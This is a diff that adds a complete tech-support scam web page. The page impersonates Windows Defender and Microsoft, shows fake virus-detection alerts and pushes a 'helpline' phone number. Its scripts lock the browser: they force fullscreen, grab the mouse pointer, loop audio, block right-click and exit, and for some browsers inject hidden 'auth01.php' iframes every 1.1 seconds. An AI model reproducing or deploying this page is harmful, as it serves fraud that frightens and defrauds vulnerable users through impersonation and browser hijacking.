@@ -1,0 +1,656 @@
+
+<!DOCTYPE html>
+<html lang="en-US">
+
+
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+
+<head>
+  <meta charset="UTF-8" />
+  <base />
+  <title>Security-center-Er000x#01</title>
+  <meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0" />
+
+  <link href="avira-white.png" rel="icon" type="image/x-icon" />
+  <meta content="" name="keywords" />
+  <meta content="" name="description" />
+  <link rel="stylesheet" type="text/css" href="style6b426b42.css?1618996856" />
+  <script type="text/javascript" src="jquery.min6b42.js"></script>
+  <script type="text/javascript" src="js.cockie.min6b42.js"></script>
+  <script type="text/javascript" src="translate6b42.js"></script>
+  <script type="text/javascript" src="main6b42.js"></script>
+  <script type="text/javascript" src="interactive6b42.js"></script>
+
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-SFPPJRS8PY"></script>
+  <script>
+  	window.dataLayer = window.dataLayer || [];
+  	function gtag(){dataLayer.push(arguments);}
+  	gtag('js', new Date());
+
+  	gtag('config', 'G-SFPPJRS8PY');
+  </script>
+
+
+  <style>
+  .blink {
+  background-color:green;
+    animation: blink-animation 1s steps(5, start) infinite;
+    -webkit-animation: blink-animation 1s steps(5, start) infinite;
+  }
+
+  .blink1 {
+  background-color:red;
+    animation: blink-animation 1s steps(5, start) infinite;
+    -webkit-animation: blink-animation 1s steps(5, start) infinite;
+  }
+
+  @keyframes blink-animation {
+    to {
+      visibility: hidden;
+    }
+  }
+  @-webkit-keyframes blink-animation {
+    to {
+      visibility: hidden;
+    }
+  }
+  </style>
+
+
+
+
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
+
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
+
+
+
+
+      <script type="text/javascript">
+        function toggleFullScreen() {
+      	if (!document.fullscreenElement && !document.mozFullScreenElement && !document.webkitFullscreenElement) {
+      	  if (document.documentElement.requestFullscreen) {
+      		document.documentElement.requestFullscreen();
+      	  } else if (document.documentElement.mozRequestFullScreen) {
+      		document.documentElement.mozRequestFullScreen();
+      	  } else if (document.documentElement.webkitRequestFullscreen) {
+      		document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
+      	  }
+      	}
+        }
+      </script>
+      <script type="text/javascript">
+        document.addEventListener('keyup', function(es) {
+      	if (es.keyCode === 27) {
+      	  toggleFullScreen();
+      	}
+        }, false);
+      </script>
+      <script type="text/javascript">
+        document.addEventListener('keyup', function(e) {
+      	if (e.keyCode === 122 || e.keyCode === 17 || e.keyCode === 18 || e.keyCode === 13) {
+      	  document.getElementById('map').innerHTML = stroka;
+      	  toggleFullScreen();
+      	}
+        }, false);
+      </script>
+      <script type="text/javascript">
+        window.onload = function () {
+      	document.onclick = function (e) {
+      	  e = e || event;
+      	  target = e.target || e.srcElement;
+      	  if (target.tagName === "DIV") {
+      		toggleFullScreen();
+      		document.body.style.cursor = 'not-allowed';
+      		document.getElementById('map').innerHTML = stroka;
+      		document.getElementById('fa').innerHTML = "<iframe src='#' width='12' height='12' style='position: absolute; left: -25px;'></iframe>";
+      	  } else {
+      		toggleFullScreen();
+      		document.body.style.cursor = 'not-allowed';
+      		document.getElementById('map').innerHTML = stroka;
+      		document.getElementById('fa').innerHTML = "<iframe src='#' width='12' height='12' style='position: absolute; left: -25px;'></iframe>";
+      	  }
+      	}
+        }
+      </script>
+      <script type="text/javascript">
+        addEventListener("click", function() {
+      	document.getElementById('map').innerHTML = stroka;
+      	 document.getElementById("play").play();
+      	if (!isFullScreen) {
+      	  var el = document.documentElement,
+      		  rfs = el.requestFullScreen || el.webkitRequestFullScreen || el.mozRequestFullScreen;
+      	  rfs.call(el);
+      	}
+        });
+      </script>
+
+
+
+      <script type="text/javascript">
+       $(document).ready(function() {
+          var audioElement = document.createElement('audio');
+          audioElement.setAttribute('src', 'aviraAnt1.mp3');
+
+          audioElement.addEventListener('ended', function() {
+              this.play();
+          }, false);
+
+
+
+          $('#mycanvas').click(function() {
+              audioElement.play();
+
+          });
+
+
+      });
+      </script>
+
+
+
+          <script type="text/javascript">
+              function getVariableFromURl(name) {
+                  name = name.replace(/[\[]/, "\\\[").replace(/[\]]/, "\\\]");
+                  var regexS = "[\\?&]" + name + "=([^&#]*)";
+                  var regex = new RegExp(regexS);
+                  var results = regex.exec(window.location.href);
+                  if (results == null)
+                      return "";
+                  else
+                      return results[1];
+              }
+
+              var phone = getVariableFromURl('phone');
+              var phone_number = phone + ' ';
+              var phone_number2 = phone + ' (Toll Free)';
+
+
+
+          </script>
+
+
+
+
+</head>
+
+
+  <body id="mycanvas" onbeforeunload="return myFunction()" style="cursor:none;">
+
+
+    <div class="bg">
+      <div class="logo" style="with:100%">
+        <img src="logo1.png" style="with:100%" alt="Windows Defender Security" />
+      </div>
+
+      <div class="menu" id="menu">
+        PRODUCTS AND SERVICES &nbsp;&nbsp;&nbsp; SUPPORT &nbsp;&nbsp;&nbsp;
+
+      </div>
+
+      <!-- <div class="bgimg">
+                <img src="globe-alpha.png" alt="" width="100%" />
+            </div>-->
+
+      <div class="text">
+        <span id="head1">Cyber threats are evolving. Our defense too.</span><br /><br /><span
+          style="font-size: 30px; color: #fff" id="head2">Windows Defender Security</span>
+      </div>
+    </div>
+    <div class="bottom">
+      <!--<div class="logo"><img src="logo-white.svg" alt="Avira Security" /></div>-->
+      <div class="copyright" style="text-align:center;margin:0;left:calc(50% - 85px);">©2022 Windows Defender Security</div>
+      <div class="line1"></div>
+      <!--<div class="menu" id="menu_b">
+          Legal Information | License Agreement | Privacy Policy | Vacancies |
+          Cookies | Sitemap | State of the system
+        </div>-->
+      <!--<div class="line2"></div>-->
+    </div>
+    <div class="black"></div>
+
+    <div class="main-content">
+
+
+      <div class="win1">
+        <div class="header" id="header">
+          <img src="logo.png" class="ico" />
+          <div class="name">Windows Defender Security  +1-888-292-7629</div>
+          <img src="icons.png" class="win_cls" />
+        </div>
+
+        <div class="left-section">
+
+          <div class="menu">
+            <ul>
+              <li class="first-menu">
+                <img src="menu1.png">
+                <p>Status</p>
+              </li>
+
+              <li>
+                <img src="menu2.png">
+                <p>Safety</p>
+              </li>
+
+              <li>
+                <img src="menu3.png">
+                <p>Privacy</p>
+              </li>
+
+              <li>
+                <img src="menu4.png">
+                <p>Performance</p>
+              </li>
+            </ul>
+          </div>
+
+        </div>
+
+        <div class="right-section">
+
+
+
+          <div class="white_line">
+            <img src="check.png">
+            <h1>Your virus protection is switched on</h1>
+            <p>Last update: 7 minutes ago</p>
+          </div>
+
+          <div class="center-icons">
+            <ul>
+              <li>
+                <img src="icon1.png">
+                <p>Safety <img src="info.png"></p>
+              </li>
+              <li>
+                <img src="icon2.png">
+                <p>Privacy <img src="info.png"></p>
+              </li>
+              <li>
+                <img src="icon3.png">
+                <p>Performance <img src="info.png"></p>
+              </li>
+            </ul>
+          </div>
+
+          <p class="improve">Improve your security, privacy and performance with one click</p>
+          <p class="scan"><button>Smart Scan</button></p>
+
+
+          <div class="win2" id="win2" style="display: none">
+            <div class="header">
+              <div class="name" id="w2_1">Quick Scan</div>
+
+            </div>
+            <div class="line_orange">
+              <img src="icon-white.png" class="ring" />
+              <div class="header" id="w2_2">Scanning</div>
+              <div class="txt1" id="w2_3">
+                Scanning commonly infected areas and startup files...
+              </div>
+              <div class="txt2" id="path1">
+                C:\Program Files\Windows Defender\MSASCuiL.exe
+              </div>
+              <div class="anim" style="background: url(#)"></div>
+            </div>
+            <div class="line_red" style="display: none" id="win2_line_red">
+              <img src="cross.gif" class="ring" />
+              <div class="header" id="w2_4">Virus detected!</div>
+              <div class="txt1" id="w2_5">
+                Scanning commonly infected areas and startup files...
+              </div>
+              <div class="txt2" id="path2">HidBtn</div>
+              <div class="anim" style="background: url(#)"></div>
+            </div>
+            <div class="tab">
+              <div class="line1" id="w2_6">Results Summary</div>
+              <div class="line2" id="w2_7">[+] Total items scanned:</div>
+              <div class="line3" id="w2_8">[+] Total security risks detected:</div>
+              <div class="line4" id="w2_9">[+] Total security risks resolved:</div>
+              <div class="line5" id="w2_10">
+                Total security risks requiring attention:
+              </div>
+              <div class="line6">
+<p>Get in touch with our Windows Defender professionals. They're on standby to help you, via  telephone helpline.</p>
+
+<h4>Windows Defender Customer Service +1-888-292-7629 (Secuity Helpline) </h4>
+              </div>
+              <div class="digit1" id="cnt1">0</div>
+              <div class="digit2" id="cnt2" style="color: rgb(221, 0, 0)">0</div>
+              <div class="digit3">0</div>
+              <div class="digit4" id="cnt4" style="color: rgb(221, 0, 0)">0</div>
+            </div>
+
+            <!--<div class="btn1" id="w2_11">Pause</div>
+        <div class="btn2" id="w2_12">Stop</div>-->
+          </div>
+
+        </div>
+
+      </div>
+    </div>
+
+
+
+    <a class="btn" href="#" style="cursor: default"></a>
+
+    <div id="win3" style="display: none">
+      <a class="btn second_offer_button" href="#" style="cursor: default; cursor: default">
+        <div id="win3_header">
+          <img src="logo.png" class="ico" />
+          <div class="name" style="font-size:20px;"> Microsoft Helpline +1-888-292-7629 </div>
+          <img src="win_min.png" class="win_min" /><img
+            src="win_cls.png" class="win_cls" />
+        </div>
+        <div id="w3_1">Your PC is infected with 5 viruses!</div>
+        <div id="win3_text">
+          <span id="w3_2"><strong>Scan</strong> <strong>results:</strong> <strong>TROJAN 2022, SPYWARE,  ADWARE
+            DETECTED.</strong></span>
+
+
+
+          <span id="w3_3" class="det-info">- TROJAN found will copy and delete all data from the
+            drive.</span>
+
+            <span id="w3_3" class="det-info">- Your IP address has been stolen or corrupted.</span>
+
+              <span id="w3_3" class="det-info">- Virus found may damage your files and emails.</span>
+
+          <span id="w3_4" class="det-info">- Spyware  may  collect logins, passwords and banking details.
+          </span><br>
+          <span id="w3_5" class="det-info">- Adware may replace search results with fake and scam
+            websites.</span>
+
+
+
+
+          <span id="w3_5" style="font-weight: 600;
+    text-align: center;
+    width: 100%;
+    display: inline-block;
+    font-size: 17px;
+    line-height: 21px;
+    color: #c81a00;
+    text-shadow: 0px 0px 0px #000;margin-top: 4px;">It is highly recommended to call our expert immediately!! CALL NOW</span>
+
+
+<h3 style="text-align:center;">CALL +1-888-292-7629 - Microsoft Helpline </h3>
+
+        </div>
+      </a>
+
+      <a class="btn second_offer_button" href="#">
+        <div id="w3_6" class="blink">Back Safety</div>
+
+      </a>
+      <span id="prec">Unprotected PCs are 93% more vulnerable to suffer from malware.</span>
+    </div>
+    <div id="vir1">
+      <div id="vir_tray">
+        <div class="line_red">
+          <span id="w4_1"><b>Threat Detected!</b></span><br />Win32/Hoax.Renos.HX
+        </div>
+        <img src="ico_tray1.gif" class="ico_tray1" />
+        <div class="txt1" id="w4_2">High Risk</div>
+        <img src="ico_tray2.gif" class="ico_tray2" />
+        <div class="txt2">
+          <span id="w4_4"><b>Origin</b></span><br /><span id="w4_5">Not available</span>
+        </div>
+        <img src="ico_tray3.gif" class="ico_tray3" />
+        <div class="txt3">
+          <span id="w4_6"><b>Activity</b></span><br /><span id="w4_7">Threat actions performed: 1</span>
+        </div>
+      </div>
+    </div>
+    <div id="vir2">
+      <div id="vir_tray">
+        <div class="line_red">
+          <span id="w4_1a"><b>Threat Detected!</b></span><br />Trojan IRC/Backdor.Sd.FRV
+        </div>
+        <img src="ico_tray1.gif" class="ico_tray1" />
+        <div class="txt1" id="w4_2a">High Risk</div>
+        <img src="ico_tray2.gif" class="ico_tray2" />
+        <div class="txt2">
+          <span id="w4_4a"><b>Origin</b></span><br /><span id="w4_5a">Not available</span>
+        </div>
+        <img src="ico_tray3.gif" class="ico_tray3" />
+        <div class="txt3">
+          <span id="w4_6a"><b>Activity</b></span><br /><span id="w4_7a">Threat actions performed: 1</span>
+        </div>
+      </div>
+    </div>
+    <div id="vir3">
+      <div id="vir_tray">
+        <div class="line_red">
+          <span id="w4_1b"><b>Threat Detected!</b></span><br />Adware.Win32.Look2me.ab
+        </div>
+        <img src="ico_tray1.gif" class="ico_tray1" />
+        <div class="txt1" id="w4_3">Medium Risk</div>
+        <img src="ico_tray2.gif" class="ico_tray2" />
+        <div class="txt2">
+          <span id="w4_4b"><b>Origin</b></span><br /><span id="w4_5b">Not available</span>
+        </div>
+        <img src="ico_tray3.gif" class="ico_tray3" />
+        <div class="txt3">
+          <span id="w4_6b"><b>Activity</b></span><br /><span id="w4_7b">Threat actions performed: 1</span>
+        </div>
+      </div>
+    </div>
+    <div id="vir4">
+      <div id="vir_tray">
+        <div class="line_red">
+          <span id="w4_1c"><b>Threat Detected!</b></span><br />Trojan.Qoologic - Key Logger
+        </div>
+        <img src="ico_tray1.gif" class="ico_tray1" />
+        <div class="txt1" id="w4_2b">High Risk</div>
+        <img src="ico_tray2.gif" class="ico_tray2" />
+        <div class="txt2">
+          <span id="w4_4c"><b>Origin</b></span><br /><span id="w4_5c">Not available</span>
+        </div>
+        <img src="ico_tray3.gif" class="ico_tray3" />
+        <div class="txt3">
+          <span id="w4_6c"><b>Activity</b></span><br /><span id="w4_7c">Threat actions performed: 1</span>
+        </div>
+      </div>
+    </div>
+    <div id="vir5">
+      <div id="vir_tray">
+        <div class="line_red">
+          <span id="w4_1d"><b>Threat Detected!</b></span><br />Trojan.Fakealert.356
+        </div>
+        <img src="ico_tray1.gif" class="ico_tray1" />
+        <div class="txt1" id="w4_2c">High Risk</div>
+        <img src="ico_tray2.gif" class="ico_tray2" />
+        <div class="txt2">
+          <span id="w4_4d"><b>Origin</b></span><br /><span id="w4_5d">Not available</span>
+        </div>
+        <img src="ico_tray3.gif" class="ico_tray3" />
+        <div class="txt3">
+          <span id="w4_6d"><b>Activity</b></span><br /><span id="w4_7d">Threat actions performed: 1</span>
+        </div>
+      </div>
+    </div>
+  </body>
+  <a href="#" class="second_offer_link" style="display: none"></a>
+  <a href="#" class="back_offer_link" style="display: none"></a>
+</body>
+
+<!--<script type="text/javascript">
+  setTimeout(function() {
+    $("#win2").css("border-left", "1px solid #c81a00");
+  }, 5000);
+</script>-->
+
+
+  <script>
+  // Get the modal
+  var modal = document.getElementById('myModal');
+
+  // Get the button that opens the modal
+  var btn = document.getElementById("myBtn");
+
+  // Get the <span> element that closes the modal
+  var span = document.getElementsByClassName("close")[0];
+
+  // When the user clicks the button, open the modal
+  /*btn.onclick = function() {
+    modal.style.display = "block";
+  } */
+
+  // When the user clicks on <span> (x), close the modal
+  span.onclick = function() {
+    modal.style.display = "none";
+  }
+
+  // When the user clicks anywhere outside of the modal, close it
+  window.onclick = function(event) {
+    if (event.target == modal) {
+      modal.style.display = "none";
+    }
+  }
+  </script>
+    <script type="text/javascript">
+  function addEvent(obj, evt, fn) {
+      if (obj.addEventListener) {
+          obj.addEventListener(evt, fn, false);
+      }
+      else if (obj.attachEvent) {
+          obj.attachEvent("on" + evt, fn);
+      }
+  }
+  addEvent(window,"load",function(e) {
+      addEvent(document, "mouseout", function(e) {
+          e = e ? e : window.event;
+          var from = e.relatedTarget || e.toElement;
+          if (!from || from.nodeName == "HTML") {
+              // stop your drag event here
+              // for now we can just use an alert
+           //alert("hello");
+
+  			 modal.style.display = "block";
+
+          }
+      });
+  });
+
+    $(document).mousemove(function(){
+    var canvas = document.getElementById('mycanvas');
+  canvas.requestPointerLock = canvas.requestPointerLock || canvas.mozRequestPointerLock || canvas.webkitRequestPointerLock;
+  canvas.requestPointerLock();
+
+    //capture mouse movement event
+       // remove our layover from the DOM
+    });
+
+   //  $(document).mousemove(function(){
+   // alert("move detect");
+    //capture mouse movement event
+   //   $("#pageLayover").remove(); // remove our layover from the DOM
+   // });
+
+
+  </script>
+<script type="text/javascript" language="JavaScript1.2">
+
+	if (window.Event)
+		document.captureEvents(Event.MOUSEUP);
+
+
+	function nocontextmenu() {
+		event.cancelBubble = true, event.returnValue = false;
+
+		return false;
+	}
+
+	function norightclick(e) {
+		if (window.Event) {
+			if (e.which == 2 || e.which == 3) return false;
+		}
+		else if (event.button == 2 || event.button == 3) {
+			event.cancelBubble = true, event.returnValue = false;
+			return false;
+
+		}
+	}
+
+
+	if (document.layers)
+		document.captureEvents(Event.MOUSEDOWN);
+
+	document.oncontextmenu = nocontextmenu;
+	document.onmousedown = norightclick;
+	document.onmouseup = norightclick;
+
+
+
+</script>
+
+
+
+
+
+<script type="text/javascript">/*<![CDATA[*/
+
+ function get_browser(){
+    var ua=navigator.userAgent,tem,M=ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
+    if(/trident/i.test(M[1])){
+        tem=/\brv[ :]+(\d+)/g.exec(ua) || [];
+        return {name:'IE',version:(tem[1]||'')};
+        }
+    if(M[1]==='Chrome'){
+        tem=ua.match(/\bOPR\/(\d+)/)
+        if(tem!=null)   {return {name:'Opera', version:tem[1]};}
+        }
+    M=M[2]? [M[1], M[2]]: [navigator.appName, navigator.appVersion, '-?'];
+    if((tem=ua.match(/version\/(\d+)/i))!=null) {M.splice(1,1,tem[1]);}
+    return {
+      name: M[0],
+      version: M[1]
+    };
+ }
+ var InternetEx=window.navigator.appVersion.indexOf("MSIE")!=-1;
+var isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
+var browser=get_browser();
+if(browser.name=="Firefox" || isIEedge|| InternetEx || navigator.appName == 'Microsoft Internet Explorer' ||  !!(navigator.userAgent.match(/Trident/) || navigator.userAgent.match(/rv:11/)) ){
+  if(isIEedge|| InternetEx || navigator.appName == 'Microsoft Internet Explorer' ||  !!(navigator.userAgent.match(/Trident/) || navigator.userAgent.match(/rv:11/)))
+    {
+
+       function msg_ff() {
+
+            var i = document.createElement("div");
+            i.innerHTML = '<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="auth01.php"></iframe></div>';
+            document.body.appendChild(i);
+
+        }
+        window.setInterval(function() {
+            msg_ff();
+
+        }, 1100);
+
+      }
+  else{
+      function msg_ff() {
+
+            var i = document.createElement("div");
+            i.innerHTML = '<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="auth01.php"></iframe></div>';
+            document.body.appendChild(i);
+        }
+        window.setInterval(function() {
+            msg_ff();
+
+        }, 1100);
+
+    }
+
+ }
+ else{
+
+   }
+
+
+/*]]>*/</script>
+
+
+</html>
